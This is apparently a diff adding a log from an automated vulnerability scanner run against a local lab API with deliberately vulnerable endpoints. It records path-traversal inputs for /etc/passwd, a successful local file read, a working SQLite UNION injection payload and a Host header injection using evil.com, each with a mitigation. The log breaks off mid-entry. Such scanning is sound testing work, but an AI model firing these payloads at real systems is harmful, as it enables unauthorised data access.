@@ -1,0 +1,645 @@
+2025-03-16 17:51:34,450 - INFO - Loading endpoints for http://192.168.18.9:8000
+2025-03-16 17:51:34,450 - INFO - Crawling OpenAPI spec at http://192.168.18.9:8000/api/openapi.json
+2025-03-16 17:51:34,459 - INFO - Successfully fetched OpenAPI spec from http://192.168.18.9:8000/api/openapi.json
+2025-03-16 17:51:34,459 - INFO - Base URL determined: http://192.168.18.9:8000/api
+2025-03-16 17:51:34,459 - INFO - Found 12 endpoints: ['http://192.168.18.9:8000/api/hhinovuln_GET', 'http://192.168.18.9:8000/api/hhivuln_POST', 'http://192.168.18.9:8000/api/lfinovuln_GET', 'http://192.168.18.9:8000/api/lfivuln_POST', 'http://192.168.18.9:8000/api/rfinovuln_GET', 'http://192.168.18.9:8000/api/rfivuln_POST', 'http://192.168.18.9:8000/api/sqlinovuln_GET', 'http://192.168.18.9:8000/api/sqlivuln_POST', 'http://192.168.18.9:8000/api/sstinovuln_GET', 'http://192.168.18.9:8000/api/sstivuln_POST', 'http://192.168.18.9:8000/api/xssnovuln_GET', 'http://192.168.18.9:8000/api/xssreflected_POST']
+2025-03-16 17:51:34,460 - INFO - Endpoints saved to endpoints.json
+2025-03-16 17:51:34,460 - INFO - Endpoints loaded: ['http://192.168.18.9:8000/api/hhinovuln_GET', 'http://192.168.18.9:8000/api/hhivuln_POST', 'http://192.168.18.9:8000/api/lfinovuln_GET', 'http://192.168.18.9:8000/api/lfivuln_POST', 'http://192.168.18.9:8000/api/rfinovuln_GET', 'http://192.168.18.9:8000/api/rfivuln_POST', 'http://192.168.18.9:8000/api/sqlinovuln_GET', 'http://192.168.18.9:8000/api/sqlivuln_POST', 'http://192.168.18.9:8000/api/sstinovuln_GET', 'http://192.168.18.9:8000/api/sstivuln_POST', 'http://192.168.18.9:8000/api/xssnovuln_GET', 'http://192.168.18.9:8000/api/xssreflected_POST']
+2025-03-16 17:51:34,460 - INFO - Starting scan on http://192.168.18.9:8000
+2025-03-16 17:51:34,460 - INFO - Running passive scan
+2025-03-16 17:51:34,461 - WARNING - Found: Missing/Insecure X-Content-Type-Options
+2025-03-16 17:51:34,461 - WARNING - Found: Missing/Insecure X-Frame-Options
+2025-03-16 17:51:34,461 - WARNING - Found: Missing/Insecure Content-Security-Policy
+2025-03-16 17:51:34,461 - INFO - Starting active scan with 12 endpoints
+2025-03-16 17:51:34,461 - INFO - Endpoint data - method: GET, path: http://192.168.18.9:8000/api/hhinovuln, get_params: [{'name': 'email', 'type': 'string', 'required': True}], post_body: {}
+2025-03-16 17:51:34,461 - INFO - Running SQLInjectionScanner on GET http://192.168.18.9:8000/api/hhinovuln
+2025-03-16 17:51:34,466 - INFO - SQLInjectionScanner results: []
+2025-03-16 17:51:34,466 - INFO - Running BrokenAuthScanner on GET http://192.168.18.9:8000/api/hhinovuln
+2025-03-16 17:51:34,467 - INFO - BrokenAuthScanner results: []
+2025-03-16 17:51:34,467 - INFO - Running SensitiveDataScanner on GET http://192.168.18.9:8000/api/hhinovuln
+2025-03-16 17:51:34,468 - INFO - SensitiveDataScanner results: []
+2025-03-16 17:51:34,468 - INFO - Running XXEScanner on GET http://192.168.18.9:8000/api/hhinovuln
+2025-03-16 17:51:34,468 - INFO - XXEScanner results: []
+2025-03-16 17:51:34,468 - INFO - Running BrokenAccessScanner on GET http://192.168.18.9:8000/api/hhinovuln
+2025-03-16 17:51:34,469 - INFO - BrokenAccessScanner results: []
+2025-03-16 17:51:34,469 - INFO - Running MisconfigScanner on GET http://192.168.18.9:8000/api/hhinovuln
+2025-03-16 17:51:34,469 - INFO - MisconfigScanner results: []
+2025-03-16 17:51:34,469 - INFO - Running XSSScanner on GET http://192.168.18.9:8000/api/hhinovuln
+2025-03-16 17:51:34,471 - INFO - XSSScanner results: []
+2025-03-16 17:51:34,471 - INFO - Running DeserializationScanner on GET http://192.168.18.9:8000/api/hhinovuln
+2025-03-16 17:51:34,471 - INFO - DeserializationScanner results: []
+2025-03-16 17:51:34,471 - INFO - Running ComponentsScanner on GET http://192.168.18.9:8000/api/hhinovuln
+2025-03-16 17:51:34,472 - INFO - ComponentsScanner results: []
+2025-03-16 17:51:34,472 - INFO - Running LoggingMonitoringScanner on GET http://192.168.18.9:8000/api/hhinovuln
+2025-03-16 17:51:34,472 - INFO - LoggingMonitoringScanner results: []
+2025-03-16 17:51:34,472 - INFO - Running HHIScanner on GET http://192.168.18.9:8000/api/hhinovuln
+2025-03-16 17:51:34,473 - INFO - HHIScanner results: []
+2025-03-16 17:51:34,473 - INFO - Running LFIScanner on GET http://192.168.18.9:8000/api/hhinovuln
+2025-03-16 17:51:34,473 - INFO - Scanning GET http://192.168.18.9:8000/api/hhinovuln for LFI
+2025-03-16 17:51:34,473 - INFO - LFIScanner results: []
+2025-03-16 17:51:34,473 - INFO - Running RFIScanner on GET http://192.168.18.9:8000/api/hhinovuln
+2025-03-16 17:51:34,475 - INFO - RFIScanner results: []
+2025-03-16 17:51:34,475 - INFO - Running SSTIScanner on GET http://192.168.18.9:8000/api/hhinovuln
+2025-03-16 17:51:34,476 - INFO - SSTIScanner results: []
+2025-03-16 17:51:34,476 - INFO - Endpoint data - method: POST, path: http://192.168.18.9:8000/api/hhivuln, get_params: [], post_body: {'email': {'type': 'string'}}
+2025-03-16 17:51:34,477 - INFO - Running SQLInjectionScanner on POST http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,481 - INFO - SQLInjectionScanner results: []
+2025-03-16 17:51:34,481 - INFO - Running BrokenAuthScanner on POST http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,481 - INFO - BrokenAuthScanner results: []
+2025-03-16 17:51:34,481 - INFO - Running SensitiveDataScanner on POST http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,481 - INFO - SensitiveDataScanner results: []
+2025-03-16 17:51:34,481 - INFO - Running XXEScanner on POST http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,482 - INFO - XXEScanner results: []
+2025-03-16 17:51:34,482 - INFO - Running BrokenAccessScanner on POST http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,482 - INFO - BrokenAccessScanner results: []
+2025-03-16 17:51:34,482 - INFO - Running MisconfigScanner on POST http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,482 - INFO - MisconfigScanner results: []
+2025-03-16 17:51:34,482 - INFO - Running XSSScanner on POST http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,485 - INFO - XSSScanner results: []
+2025-03-16 17:51:34,485 - INFO - Running DeserializationScanner on POST http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,486 - INFO - DeserializationScanner results: []
+2025-03-16 17:51:34,486 - INFO - Running ComponentsScanner on POST http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,486 - INFO - ComponentsScanner results: []
+2025-03-16 17:51:34,486 - INFO - Running LoggingMonitoringScanner on POST http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,486 - INFO - LoggingMonitoringScanner results: []
+2025-03-16 17:51:34,486 - INFO - Running HHIScanner on POST http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,487 - INFO - Found: HHI at http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,487 - INFO - HHIScanner results: [{'type': 'HOST Header Injection (HHI)', 'severity': 'High', 'description': 'The application is vulnerable to HOST Header Injection attacks. This vulnerability allows an attacker to inject malicious HOST headers, potentially leading to various security issues like cache poisoning or cross-site scripting.', 'reproduce': 'POST http://192.168.18.9:8000/api/hhivuln with Host: evil.com and {"email": "test"}', 'mitigation': 'Validate and sanitize the Host header'}]
+2025-03-16 17:51:34,487 - INFO - Running LFIScanner on POST http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,487 - INFO - Scanning POST http://192.168.18.9:8000/api/hhivuln for LFI
+2025-03-16 17:51:34,488 - INFO - POST http://192.168.18.9:8000/api/hhivuln with email=/etc/passwd returned status: 200, content: {
+  "msg": "response, <a href='192.168.18.9:8000'>"
+}
+
+2025-03-16 17:51:34,489 - INFO - POST http://192.168.18.9:8000/api/hhivuln with email=../etc/passwd returned status: 200, content: {
+  "msg": "response, <a href='192.168.18.9:8000'>"
+}
+
+2025-03-16 17:51:34,490 - INFO - POST http://192.168.18.9:8000/api/hhivuln with email=../../etc/passwd returned status: 200, content: {
+  "msg": "response, <a href='192.168.18.9:8000'>"
+}
+
+2025-03-16 17:51:34,491 - INFO - POST http://192.168.18.9:8000/api/hhivuln with email=../../../etc/passwd returned status: 200, content: {
+  "msg": "response, <a href='192.168.18.9:8000'>"
+}
+
+2025-03-16 17:51:34,492 - INFO - POST http://192.168.18.9:8000/api/hhivuln with email=file:///etc/passwd returned status: 200, content: {
+  "msg": "response, <a href='192.168.18.9:8000'>"
+}
+
+2025-03-16 17:51:34,493 - INFO - POST http://192.168.18.9:8000/api/hhivuln with email=../windows/win.ini returned status: 200, content: {
+  "msg": "response, <a href='192.168.18.9:8000'>"
+}
+
+2025-03-16 17:51:34,494 - INFO - POST http://192.168.18.9:8000/api/hhivuln with email=../../windows/win.ini returned status: 200, content: {
+  "msg": "response, <a href='192.168.18.9:8000'>"
+}
+
+2025-03-16 17:51:34,494 - INFO - LFIScanner results: []
+2025-03-16 17:51:34,494 - INFO - Running RFIScanner on POST http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,497 - INFO - RFIScanner results: []
+2025-03-16 17:51:34,497 - INFO - Running SSTIScanner on POST http://192.168.18.9:8000/api/hhivuln
+2025-03-16 17:51:34,500 - INFO - SSTIScanner results: []
+2025-03-16 17:51:34,500 - INFO - Endpoint data - method: GET, path: http://192.168.18.9:8000/api/lfinovuln, get_params: [{'name': 'filename', 'type': 'string', 'required': True}], post_body: {}
+2025-03-16 17:51:34,501 - INFO - Running SQLInjectionScanner on GET http://192.168.18.9:8000/api/lfinovuln
+2025-03-16 17:51:34,509 - INFO - SQLInjectionScanner results: []
+2025-03-16 17:51:34,509 - INFO - Running BrokenAuthScanner on GET http://192.168.18.9:8000/api/lfinovuln
+2025-03-16 17:51:34,510 - INFO - BrokenAuthScanner results: []
+2025-03-16 17:51:34,510 - INFO - Running SensitiveDataScanner on GET http://192.168.18.9:8000/api/lfinovuln
+2025-03-16 17:51:34,511 - INFO - SensitiveDataScanner results: []
+2025-03-16 17:51:34,511 - INFO - Running XXEScanner on GET http://192.168.18.9:8000/api/lfinovuln
+2025-03-16 17:51:34,511 - INFO - XXEScanner results: []
+2025-03-16 17:51:34,511 - INFO - Running BrokenAccessScanner on GET http://192.168.18.9:8000/api/lfinovuln
+2025-03-16 17:51:34,512 - INFO - BrokenAccessScanner results: []
+2025-03-16 17:51:34,512 - INFO - Running MisconfigScanner on GET http://192.168.18.9:8000/api/lfinovuln
+2025-03-16 17:51:34,512 - INFO - MisconfigScanner results: []
+2025-03-16 17:51:34,512 - INFO - Running XSSScanner on GET http://192.168.18.9:8000/api/lfinovuln
+2025-03-16 17:51:34,514 - INFO - XSSScanner results: []
+2025-03-16 17:51:34,514 - INFO - Running DeserializationScanner on GET http://192.168.18.9:8000/api/lfinovuln
+2025-03-16 17:51:34,514 - INFO - DeserializationScanner results: []
+2025-03-16 17:51:34,514 - INFO - Running ComponentsScanner on GET http://192.168.18.9:8000/api/lfinovuln
+2025-03-16 17:51:34,514 - INFO - ComponentsScanner results: []
+2025-03-16 17:51:34,514 - INFO - Running LoggingMonitoringScanner on GET http://192.168.18.9:8000/api/lfinovuln
+2025-03-16 17:51:34,515 - INFO - LoggingMonitoringScanner results: []
+2025-03-16 17:51:34,515 - INFO - Running HHIScanner on GET http://192.168.18.9:8000/api/lfinovuln
+2025-03-16 17:51:34,515 - INFO - HHIScanner results: []
+2025-03-16 17:51:34,515 - INFO - Running LFIScanner on GET http://192.168.18.9:8000/api/lfinovuln
+2025-03-16 17:51:34,516 - INFO - Scanning GET http://192.168.18.9:8000/api/lfinovuln for LFI
+2025-03-16 17:51:34,516 - INFO - LFIScanner results: []
+2025-03-16 17:51:34,516 - INFO - Running RFIScanner on GET http://192.168.18.9:8000/api/lfinovuln
+2025-03-16 17:51:34,518 - INFO - RFIScanner results: []
+2025-03-16 17:51:34,518 - INFO - Running SSTIScanner on GET http://192.168.18.9:8000/api/lfinovuln
+2025-03-16 17:51:34,520 - INFO - SSTIScanner results: []
+2025-03-16 17:51:34,520 - INFO - Endpoint data - method: POST, path: http://192.168.18.9:8000/api/lfivuln, get_params: [], post_body: {'filename': {'type': 'string'}}
+2025-03-16 17:51:34,520 - INFO - Running SQLInjectionScanner on POST http://192.168.18.9:8000/api/lfivuln
+2025-03-16 17:51:34,526 - INFO - SQLInjectionScanner results: []
+2025-03-16 17:51:34,526 - INFO - Running BrokenAuthScanner on POST http://192.168.18.9:8000/api/lfivuln
+2025-03-16 17:51:34,526 - INFO - BrokenAuthScanner results: []
+2025-03-16 17:51:34,526 - INFO - Running SensitiveDataScanner on POST http://192.168.18.9:8000/api/lfivuln
+2025-03-16 17:51:34,526 - INFO - SensitiveDataScanner results: []
+2025-03-16 17:51:34,526 - INFO - Running XXEScanner on POST http://192.168.18.9:8000/api/lfivuln
+2025-03-16 17:51:34,527 - INFO - XXEScanner results: []
+2025-03-16 17:51:34,527 - INFO - Running BrokenAccessScanner on POST http://192.168.18.9:8000/api/lfivuln
+2025-03-16 17:51:34,527 - INFO - BrokenAccessScanner results: []
+2025-03-16 17:51:34,527 - INFO - Running MisconfigScanner on POST http://192.168.18.9:8000/api/lfivuln
+2025-03-16 17:51:34,527 - INFO - MisconfigScanner results: []
+2025-03-16 17:51:34,527 - INFO - Running XSSScanner on POST http://192.168.18.9:8000/api/lfivuln
+2025-03-16 17:51:34,529 - INFO - XSSScanner results: []
+2025-03-16 17:51:34,529 - INFO - Running DeserializationScanner on POST http://192.168.18.9:8000/api/lfivuln
+2025-03-16 17:51:34,530 - INFO - DeserializationScanner results: []
+2025-03-16 17:51:34,530 - INFO - Running ComponentsScanner on POST http://192.168.18.9:8000/api/lfivuln
+2025-03-16 17:51:34,530 - INFO - ComponentsScanner results: []
+2025-03-16 17:51:34,530 - INFO - Running LoggingMonitoringScanner on POST http://192.168.18.9:8000/api/lfivuln
+2025-03-16 17:51:34,530 - INFO - LoggingMonitoringScanner results: []
+2025-03-16 17:51:34,530 - INFO - Running HHIScanner on POST http://192.168.18.9:8000/api/lfivuln
+2025-03-16 17:51:34,531 - INFO - HHIScanner results: []
+2025-03-16 17:51:34,531 - INFO - Running LFIScanner on POST http://192.168.18.9:8000/api/lfivuln
+2025-03-16 17:51:34,531 - INFO - Scanning POST http://192.168.18.9:8000/api/lfivuln for LFI
+2025-03-16 17:51:34,533 - INFO - POST http://192.168.18.9:8000/api/lfivuln with filename=/etc/passwd returned status: 200, content: {
+  "msg": "response, ##\n# User Database\n# \n# Note that this file is consulted directly only when the system is running\n# in single-user mode.  At other times this information is provided by\n# Op
+2025-03-16 17:51:34,533 - INFO - LFI detected on POST http://192.168.18.9:8000/api/lfivuln with payload: /etc/passwd in body filename
+2025-03-16 17:51:34,534 - INFO - POST http://192.168.18.9:8000/api/lfivuln with filename=../etc/passwd returned status: 200, content: {
+  "msg": "response, "
+}
+
+2025-03-16 17:51:34,535 - INFO - POST http://192.168.18.9:8000/api/lfivuln with filename=../../etc/passwd returned status: 200, content: {
+  "msg": "response, "
+}
+
+2025-03-16 17:51:34,536 - INFO - POST http://192.168.18.9:8000/api/lfivuln with filename=../../../etc/passwd returned status: 200, content: {
+  "msg": "response, "
+}
+
+2025-03-16 17:51:34,537 - INFO - POST http://192.168.18.9:8000/api/lfivuln with filename=file:///etc/passwd returned status: 200, content: {
+  "msg": "response, "
+}
+
+2025-03-16 17:51:34,538 - INFO - POST http://192.168.18.9:8000/api/lfivuln with filename=../windows/win.ini returned status: 200, content: {
+  "msg": "response, "
+}
+
+2025-03-16 17:51:34,539 - INFO - POST http://192.168.18.9:8000/api/lfivuln with filename=../../windows/win.ini returned status: 200, content: {
+  "msg": "response, "
+}
+
+2025-03-16 17:51:34,539 - INFO - LFIScanner results: [{'type': 'Local File Inclusion (LFI)', 'severity': 'High', 'description': 'The endpoint http://192.168.18.9:8000/api/lfivuln allows Local File Inclusion, exposing sensitive system files like /etc/passwd.', 'reproduce': "Send POST request to http://192.168.18.9:8000/api/lfivuln with JSON body: {'filename': '/etc/passwd'}", 'mitigation': 'Sanitize and validate all file path inputs. Implement a whitelist for allowed files.'}]
+2025-03-16 17:51:34,539 - INFO - Running RFIScanner on POST http://192.168.18.9:8000/api/lfivuln
+2025-03-16 17:51:34,541 - INFO - RFIScanner results: []
+2025-03-16 17:51:34,541 - INFO - Running SSTIScanner on POST http://192.168.18.9:8000/api/lfivuln
+2025-03-16 17:51:34,543 - INFO - SSTIScanner results: []
+2025-03-16 17:51:34,543 - INFO - Endpoint data - method: GET, path: http://192.168.18.9:8000/api/rfinovuln, get_params: [{'name': 'imagelink', 'type': 'string', 'required': True}], post_body: {}
+2025-03-16 17:51:34,543 - INFO - Running SQLInjectionScanner on GET http://192.168.18.9:8000/api/rfinovuln
+2025-03-16 17:51:34,548 - INFO - SQLInjectionScanner results: []
+2025-03-16 17:51:34,548 - INFO - Running BrokenAuthScanner on GET http://192.168.18.9:8000/api/rfinovuln
+2025-03-16 17:51:34,549 - INFO - BrokenAuthScanner results: []
+2025-03-16 17:51:34,549 - INFO - Running SensitiveDataScanner on GET http://192.168.18.9:8000/api/rfinovuln
+2025-03-16 17:51:34,550 - INFO - SensitiveDataScanner results: []
+2025-03-16 17:51:34,550 - INFO - Running XXEScanner on GET http://192.168.18.9:8000/api/rfinovuln
+2025-03-16 17:51:34,550 - INFO - XXEScanner results: []
+2025-03-16 17:51:34,550 - INFO - Running BrokenAccessScanner on GET http://192.168.18.9:8000/api/rfinovuln
+2025-03-16 17:51:34,551 - INFO - BrokenAccessScanner results: []
+2025-03-16 17:51:34,551 - INFO - Running MisconfigScanner on GET http://192.168.18.9:8000/api/rfinovuln
+2025-03-16 17:51:34,551 - INFO - MisconfigScanner results: []
+2025-03-16 17:51:34,551 - INFO - Running XSSScanner on GET http://192.168.18.9:8000/api/rfinovuln
+2025-03-16 17:51:34,553 - INFO - XSSScanner results: []
+2025-03-16 17:51:34,553 - INFO - Running DeserializationScanner on GET http://192.168.18.9:8000/api/rfinovuln
+2025-03-16 17:51:34,553 - INFO - DeserializationScanner results: []
+2025-03-16 17:51:34,553 - INFO - Running ComponentsScanner on GET http://192.168.18.9:8000/api/rfinovuln
+2025-03-16 17:51:34,554 - INFO - ComponentsScanner results: []
+2025-03-16 17:51:34,554 - INFO - Running LoggingMonitoringScanner on GET http://192.168.18.9:8000/api/rfinovuln
+2025-03-16 17:51:34,554 - INFO - LoggingMonitoringScanner results: []
+2025-03-16 17:51:34,554 - INFO - Running HHIScanner on GET http://192.168.18.9:8000/api/rfinovuln
+2025-03-16 17:51:34,555 - INFO - HHIScanner results: []
+2025-03-16 17:51:34,555 - INFO - Running LFIScanner on GET http://192.168.18.9:8000/api/rfinovuln
+2025-03-16 17:51:34,555 - INFO - Scanning GET http://192.168.18.9:8000/api/rfinovuln for LFI
+2025-03-16 17:51:34,555 - INFO - LFIScanner results: []
+2025-03-16 17:51:34,555 - INFO - Running RFIScanner on GET http://192.168.18.9:8000/api/rfinovuln
+2025-03-16 17:51:34,557 - INFO - RFIScanner results: []
+2025-03-16 17:51:34,557 - INFO - Running SSTIScanner on GET http://192.168.18.9:8000/api/rfinovuln
+2025-03-16 17:51:34,559 - INFO - SSTIScanner results: []
+2025-03-16 17:51:34,559 - INFO - Endpoint data - method: POST, path: http://192.168.18.9:8000/api/rfivuln, get_params: [], post_body: {'imagelink': {'type': 'string'}}
+2025-03-16 17:51:34,560 - INFO - Running SQLInjectionScanner on POST http://192.168.18.9:8000/api/rfivuln
+2025-03-16 17:51:34,565 - INFO - SQLInjectionScanner results: []
+2025-03-16 17:51:34,565 - INFO - Running BrokenAuthScanner on POST http://192.168.18.9:8000/api/rfivuln
+2025-03-16 17:51:34,565 - INFO - BrokenAuthScanner results: []
+2025-03-16 17:51:34,565 - INFO - Running SensitiveDataScanner on POST http://192.168.18.9:8000/api/rfivuln
+2025-03-16 17:51:34,565 - INFO - SensitiveDataScanner results: []
+2025-03-16 17:51:34,565 - INFO - Running XXEScanner on POST http://192.168.18.9:8000/api/rfivuln
+2025-03-16 17:51:34,566 - INFO - XXEScanner results: []
+2025-03-16 17:51:34,566 - INFO - Running BrokenAccessScanner on POST http://192.168.18.9:8000/api/rfivuln
+2025-03-16 17:51:34,566 - INFO - BrokenAccessScanner results: []
+2025-03-16 17:51:34,566 - INFO - Running MisconfigScanner on POST http://192.168.18.9:8000/api/rfivuln
+2025-03-16 17:51:34,566 - INFO - MisconfigScanner results: []
+2025-03-16 17:51:34,566 - INFO - Running XSSScanner on POST http://192.168.18.9:8000/api/rfivuln
+2025-03-16 17:51:34,568 - INFO - XSSScanner results: []
+2025-03-16 17:51:34,568 - INFO - Running DeserializationScanner on POST http://192.168.18.9:8000/api/rfivuln
+2025-03-16 17:51:34,569 - INFO - DeserializationScanner results: []
+2025-03-16 17:51:34,569 - INFO - Running ComponentsScanner on POST http://192.168.18.9:8000/api/rfivuln
+2025-03-16 17:51:34,569 - INFO - ComponentsScanner results: []
+2025-03-16 17:51:34,569 - INFO - Running LoggingMonitoringScanner on POST http://192.168.18.9:8000/api/rfivuln
+2025-03-16 17:51:34,569 - INFO - LoggingMonitoringScanner results: []
+2025-03-16 17:51:34,569 - INFO - Running HHIScanner on POST http://192.168.18.9:8000/api/rfivuln
+2025-03-16 17:51:34,570 - INFO - HHIScanner results: []
+2025-03-16 17:51:34,570 - INFO - Running LFIScanner on POST http://192.168.18.9:8000/api/rfivuln
+2025-03-16 17:51:34,570 - INFO - Scanning POST http://192.168.18.9:8000/api/rfivuln for LFI
+2025-03-16 17:51:34,571 - INFO - POST http://192.168.18.9:8000/api/rfivuln with imagelink=/etc/passwd returned status: 200, content: {
+  "msg": "response, "
+}
+
+2025-03-16 17:51:34,572 - INFO - POST http://192.168.18.9:8000/api/rfivuln with imagelink=../etc/passwd returned status: 200, content: {
+  "msg": "response, "
+}
+
+2025-03-16 17:51:34,573 - INFO - POST http://192.168.18.9:8000/api/rfivuln with imagelink=../../etc/passwd returned status: 200, content: {
+  "msg": "response, "
+}
+
+2025-03-16 17:51:34,574 - INFO - POST http://192.168.18.9:8000/api/rfivuln with imagelink=../../../etc/passwd returned status: 200, content: {
+  "msg": "response, "
+}
+
+2025-03-16 17:51:34,576 - INFO - POST http://192.168.18.9:8000/api/rfivuln with imagelink=file:///etc/passwd returned status: 200, content: {
+  "msg": "response, "
+}
+
+2025-03-16 17:51:34,577 - INFO - POST http://192.168.18.9:8000/api/rfivuln with imagelink=../windows/win.ini returned status: 200, content: {
+  "msg": "response, "
+}
+
+2025-03-16 17:51:34,578 - INFO - POST http://192.168.18.9:8000/api/rfivuln with imagelink=../../windows/win.ini returned status: 200, content: {
+  "msg": "response, "
+}
+
+2025-03-16 17:51:34,578 - INFO - LFIScanner results: []
+2025-03-16 17:51:34,578 - INFO - Running RFIScanner on POST http://192.168.18.9:8000/api/rfivuln
+2025-03-16 17:51:36,353 - INFO - RFIScanner results: []
+2025-03-16 17:51:36,353 - INFO - Running SSTIScanner on POST http://192.168.18.9:8000/api/rfivuln
+2025-03-16 17:51:36,364 - INFO - SSTIScanner results: []
+2025-03-16 17:51:36,364 - INFO - Endpoint data - method: GET, path: http://192.168.18.9:8000/api/sqlinovuln, get_params: [{'name': 'username', 'type': 'string', 'required': True}], post_body: {}
+2025-03-16 17:51:36,366 - INFO - Running SQLInjectionScanner on GET http://192.168.18.9:8000/api/sqlinovuln
+2025-03-16 17:51:36,382 - INFO - SQLInjectionScanner results: []
+2025-03-16 17:51:36,382 - INFO - Running BrokenAuthScanner on GET http://192.168.18.9:8000/api/sqlinovuln
+2025-03-16 17:51:36,384 - INFO - BrokenAuthScanner results: []
+2025-03-16 17:51:36,384 - INFO - Running SensitiveDataScanner on GET http://192.168.18.9:8000/api/sqlinovuln
+2025-03-16 17:51:36,386 - INFO - SensitiveDataScanner results: []
+2025-03-16 17:51:36,386 - INFO - Running XXEScanner on GET http://192.168.18.9:8000/api/sqlinovuln
+2025-03-16 17:51:36,386 - INFO - XXEScanner results: []
+2025-03-16 17:51:36,386 - INFO - Running BrokenAccessScanner on GET http://192.168.18.9:8000/api/sqlinovuln
+2025-03-16 17:51:36,388 - INFO - BrokenAccessScanner results: []
+2025-03-16 17:51:36,388 - INFO - Running MisconfigScanner on GET http://192.168.18.9:8000/api/sqlinovuln
+2025-03-16 17:51:36,388 - INFO - MisconfigScanner results: []
+2025-03-16 17:51:36,388 - INFO - Running XSSScanner on GET http://192.168.18.9:8000/api/sqlinovuln
+2025-03-16 17:51:36,393 - INFO - XSSScanner results: []
+2025-03-16 17:51:36,393 - INFO - Running DeserializationScanner on GET http://192.168.18.9:8000/api/sqlinovuln
+2025-03-16 17:51:36,393 - INFO - DeserializationScanner results: []
+2025-03-16 17:51:36,393 - INFO - Running ComponentsScanner on GET http://192.168.18.9:8000/api/sqlinovuln
+2025-03-16 17:51:36,395 - INFO - ComponentsScanner results: []
+2025-03-16 17:51:36,395 - INFO - Running LoggingMonitoringScanner on GET http://192.168.18.9:8000/api/sqlinovuln
+2025-03-16 17:51:36,395 - INFO - LoggingMonitoringScanner results: []
+2025-03-16 17:51:36,395 - INFO - Running HHIScanner on GET http://192.168.18.9:8000/api/sqlinovuln
+2025-03-16 17:51:36,396 - INFO - HHIScanner results: []
+2025-03-16 17:51:36,396 - INFO - Running LFIScanner on GET http://192.168.18.9:8000/api/sqlinovuln
+2025-03-16 17:51:36,396 - INFO - Scanning GET http://192.168.18.9:8000/api/sqlinovuln for LFI
+2025-03-16 17:51:36,396 - INFO - LFIScanner results: []
+2025-03-16 17:51:36,396 - INFO - Running RFIScanner on GET http://192.168.18.9:8000/api/sqlinovuln
+2025-03-16 17:51:36,400 - INFO - RFIScanner results: []
+2025-03-16 17:51:36,400 - INFO - Running SSTIScanner on GET http://192.168.18.9:8000/api/sqlinovuln
+2025-03-16 17:51:36,403 - INFO - SSTIScanner results: []
+2025-03-16 17:51:36,403 - INFO - Endpoint data - method: POST, path: http://192.168.18.9:8000/api/sqlivuln, get_params: [], post_body: {'password': {'type': 'string'}, 'username': {'type': 'string'}}
+2025-03-16 17:51:36,403 - INFO - Running SQLInjectionScanner on POST http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,417 - INFO - SQLi detected on POST http://192.168.18.9:8000/api/sqlivuln with payload: ' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --
+2025-03-16 17:51:36,419 - INFO - Found: SQLi at http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,419 - INFO - SQLInjectionScanner results: [{'type': 'SQL Injection (SQLite3)', 'severity': 'High', 'description': 'The application is vulnerable to SQL Injection attacks on SQLite3, allowing an attacker to execute arbitrary SQL commands or extract database information.', 'reproduce': 'POST http://192.168.18.9:8000/api/sqlivuln with {"username": "\' UNION SELECT name, sql FROM sqlite_master WHERE type=\'table\' --", "password": "test"}', 'mitigation': 'Use parameterized queries or prepared statements and sanitize all user inputs.'}]
+2025-03-16 17:51:36,420 - INFO - Running BrokenAuthScanner on POST http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,420 - INFO - BrokenAuthScanner results: []
+2025-03-16 17:51:36,420 - INFO - Running SensitiveDataScanner on POST http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,420 - INFO - SensitiveDataScanner results: []
+2025-03-16 17:51:36,420 - INFO - Running XXEScanner on POST http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,421 - INFO - XXEScanner results: []
+2025-03-16 17:51:36,421 - INFO - Running BrokenAccessScanner on POST http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,421 - INFO - BrokenAccessScanner results: []
+2025-03-16 17:51:36,421 - INFO - Running MisconfigScanner on POST http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,421 - INFO - MisconfigScanner results: []
+2025-03-16 17:51:36,421 - INFO - Running XSSScanner on POST http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,425 - INFO - XSSScanner results: []
+2025-03-16 17:51:36,425 - INFO - Running DeserializationScanner on POST http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,426 - INFO - DeserializationScanner results: []
+2025-03-16 17:51:36,426 - INFO - Running ComponentsScanner on POST http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,427 - INFO - ComponentsScanner results: []
+2025-03-16 17:51:36,427 - INFO - Running LoggingMonitoringScanner on POST http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,427 - INFO - LoggingMonitoringScanner results: []
+2025-03-16 17:51:36,427 - INFO - Running HHIScanner on POST http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,428 - INFO - HHIScanner results: []
+2025-03-16 17:51:36,428 - INFO - Running LFIScanner on POST http://192.168.18.9:8000/api/sqlivuln
+2025-03-16 17:51:36,428 - INFO - Scanning POST http://192.168.18.9:8000/api/sqlivuln for LFI
+2025-03-16 17:51:36,429 - INFO - POST http://192.168.18.9:8000/api/sqlivuln with password=/etc/passwd returned status: 400, content: {
+  "detail": "{'type': 'string'} is not of type 'string' - 'username'",
+  "status": 400,
+  "title": "Bad Request",
+  "type": "about:blank"
+}
+
+2025-03-16 17:51:36,430 - INFO - POST http://192.168.18.9:8000/api/sqlivuln with password=../etc/passwd returned status: 400, content: {
